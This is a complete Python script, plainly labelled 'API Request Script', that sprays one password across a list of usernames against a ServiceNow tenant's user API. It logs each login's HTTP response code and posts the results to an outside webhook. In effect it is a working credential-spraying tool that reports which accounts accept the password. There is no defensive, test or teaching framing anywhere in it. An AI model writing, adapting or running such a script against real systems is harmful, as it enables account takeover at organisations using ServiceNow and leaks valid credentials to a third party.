import argparse
import requests
import getpass
import json

def read_usernames_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def send_to_webhook(webhook_url, data):
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    return response.status_code

def main():
    parser = argparse.ArgumentParser(description='API Request Script')
    parser.add_argument('-u', '--usernames', required=True, help='Path to the file containing usernames')
    parser.add_argument('-p', '--password', required=True, help='ServiceNow password')
    parser.add_argument('-t', '--tenant', required=True, help='ServiceNow tenant')
    parser.add_argument('-w', '--webhook', required=True, help='Webhook URL to send results')
    args = parser.parse_args()

    base_url = f'https://{args.tenant}.servicenow.com/api/now/table/sys_user'
    headers = {'Accept': 'application/json'}

    usernames = read_usernames_from_file(args.usernames)
    results = []

    for username in usernames:
        response = requests.get(base_url, params={'sysparm_query': f'user_name={username}'}, headers=headers, auth=(username, args.password))

        result = {
            'Username': username,
            'Query': username,
            'ResponseCode': response.status_code
        }

        results.append(result)

    webhook_response_code = send_to_webhook(args.webhook, results)

    if webhook_response_code == 200:
        print("Results successfully sent to the webhook.")
    else:
        print(f"Failed to send results to the webhook. HTTP Response Code: {webhook_response_code}")

if __name__ == '__main__':
    main()
